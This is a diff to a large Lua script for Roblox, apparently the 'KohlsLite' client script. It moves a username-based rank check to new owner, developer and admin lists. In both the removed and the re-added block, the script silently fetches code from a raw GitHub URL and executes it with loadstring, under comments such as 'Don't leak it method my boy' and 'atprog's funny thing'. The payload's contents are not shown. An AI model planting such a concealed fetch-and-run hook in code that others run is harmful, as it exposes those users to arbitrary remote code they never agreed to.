@@ -13725,28 +13725,11 @@ end
 -- These run last to prevent bugs
 startupScripts()
 
--- Loading (from pqko and others) --
-local function rankcheck(username)
-    if username == "ScriptingProgrammer" or username == "me_123eq" or username == "kohlslitedev" or username == "IceStuds" or username == "yeyeyeweweweye" then
-        return "Owner"
-    else
-        return "Member"
-    end
-end
-
 Stats.loadedtime = string.format("%.2f", os.clock() - Stats.starttime)
 
 print("\n\n\n")
 print("- Debug information -")
 print("Loaded in " .. Stats.loadedtime .. "ms.")
-
-Stats.username = game.Players.LocalPlayer.Name
-Stats.rank = rankcheck(Stats.username)
-
-print("Your rank is: " .. Stats.rank)
-
--- Don't leak it method my boy ...
-loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
 
 -- KohlsLite Tags - Created by atprog
 local OWNER = {
@@ -13774,6 +13757,27 @@ local ADMIN = {
   --  "dawninja21alt",
     "jjjuuikjjikkju"
 }
+
+-- Loading (from pqko and others) --
+local function rankcheck(username)
+    if table.find(OWNER, username) then
+        return "Owner"
+    elseif table.find(DEVELOPER, username) then
+	return "Developer"
+    elseif table.find(ADMIN, username) then
+	return "Admin"
+    else
+        return "Member"
+    end
+end
+
+Stats.username = game.Players.LocalPlayer.Name
+Stats.rank = rankcheck(Stats.username)
+
+print("Your rank is: " .. Stats.rank)
+
+-- atprog's funny thing ...
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
 
 local function createBillboardGui(text, color)
     local billboardGui = Instance.new("BillboardGui")
